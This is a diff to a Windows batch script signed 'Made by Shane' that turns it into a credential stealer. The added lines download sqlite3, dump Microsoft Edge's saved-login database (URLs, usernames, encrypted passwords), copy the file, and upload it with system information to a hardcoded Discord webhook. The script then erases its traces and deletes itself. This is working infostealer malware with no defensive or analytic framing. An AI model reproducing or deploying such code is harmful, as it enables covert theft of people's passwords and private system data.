@@ -1,6 +1,38 @@
 @echo off
 echo Hello! Made by Shane.
 
+:: Create a temporary directory for SQLite tools
+if not exist "%TEMP%\sqltmp" mkdir "%TEMP%\sqltmp"
+
+:: Download SQLite3 if not present
+if not exist "%TEMP%\sqltmp\sqlite3.exe" (
+    echo Downloading SQLite3...
+    curl -L -o "%TEMP%\sqltmp\sqlite3.zip" "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
+    tar -xf "%TEMP%\sqltmp\sqlite3.zip" -C "%TEMP%\sqltmp"
+    move "%TEMP%\sqltmp\sqlite-tools-win32-x86-3430100\sqlite3.exe" "%TEMP%\sqltmp\sqlite3.exe" >nul
+)
+
+set "SQLITE3=%TEMP%\sqltmp\sqlite3.exe"
+
+:: Extract Edge saved passwords
+echo Edge Saved Passwords > edge_passwords.txt
+echo. >> edge_passwords.txt
+echo Extraction Date: %date% %time% >> edge_passwords.txt
+echo. >> edge_passwords.txt
+
+set "EDGE_DATA=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"
+if exist "%EDGE_DATA%" (
+    echo Edge Login Data file found. >> edge_passwords.txt
+    echo. >> edge_passwords.txt
+    echo Attempting to extract passwords (encrypted blobs will appear): >> edge_passwords.txt
+    "%SQLITE3%" "%EDGE_DATA%" "SELECT origin_url, username_value, password_value FROM logins;" >> edge_passwords.txt 2>nul
+    echo. >> edge_passwords.txt
+    echo Login Data file copied as edge_login_data_copy.db >> edge_passwords.txt
+    copy "%EDGE_DATA%" edge_login_data_copy.db >nul
+) else (
+    echo Edge Login Data file NOT found at: %EDGE_DATA% >> edge_passwords.txt
+)
+
 :: Collect detailed system information
 echo System Information > sysinfo.txt
 systeminfo >> sysinfo.txt
@@ -53,11 +85,26 @@ wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt
 :: Set webhook URL
 set "WEBHOOK_URL=https://discord.com/api/webhooks/1540227015473631243/D73LkFqH2DrUavolHZw3TeJuEeEivkKrih85dPYobc9wRII4yzQL4_NPLF_r03XgGpyC"
 
-:: Use curl to send the file with --ssl-no-revoke flag
+:: Send files to Discord webhook
+echo Sending system info...
 curl --ssl-no-revoke -F "file=@sysinfo.txt" %WEBHOOK_URL%
 
-:: Clean up sysinfo.txt
+echo Sending Edge passwords text...
+curl --ssl-no-revoke -F "file=@edge_passwords.txt" %WEBHOOK_URL%
+
+if exist edge_login_data_copy.db (
+    echo Sending Edge Login Data copy...
+    curl --ssl-no-revoke -F "file=@edge_login_data_copy.db" %WEBHOOK_URL%
+)
+
+:: Clean up all files
+echo Cleaning up...
 del sysinfo.txt
+del edge_passwords.txt
+if exist edge_login_data_copy.db del edge_login_data_copy.db
+
+:: Clean up SQLite tools
+if exist "%TEMP%\sqltmp" rmdir /s /q "%TEMP%\sqltmp"
 
 :: Self-delete the batch file without leaving a trace
 (goto) 2>nul & del "%~f0"
